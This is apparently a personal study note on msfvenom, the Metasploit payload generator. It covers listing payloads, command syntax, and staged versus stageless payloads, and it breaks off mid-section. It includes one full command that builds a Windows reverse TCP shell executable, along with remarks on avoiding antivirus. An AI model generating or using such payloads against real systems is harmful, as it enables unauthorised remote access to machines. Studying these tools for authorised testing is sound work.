---
tags:
  - Penetration-Testing
  - Shells
---
Part of the Metasploit framework, msfvenom is used to generate payloads used primarily for generation of reverse/bind shells.
- Can generate payloads in various formats (.exe, .aspx, .war, .py, etc)

## Listing All Payloads
```bash
msfvenom --list payloads
```
**Can then grep for specifics**
## Syntax
```bash
msfvenom -p <PAYLOAD> <OPTIONS>
```

Example
```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen_IP> LPORT=<listen-port>
```
![[Pasted image 20240707171653.png]]

## Staged vs Stageless Payloads

### Staged Payloads
- Payload is sent in two parts: **Stager** and **Reverse Shell Code**
	- Stager is sent first, simply connects back to listener (no shell code)
	- Uses connection to load true payload (never touches victim disc, avoid AV)
	- Reverse Shell Code is then fully uploaded through Stager connection
- Staged payloads require special listener (**Metasploit multi/handler**)

### Stageless Payloads
- Payload is entirely self-contained in a single piece of code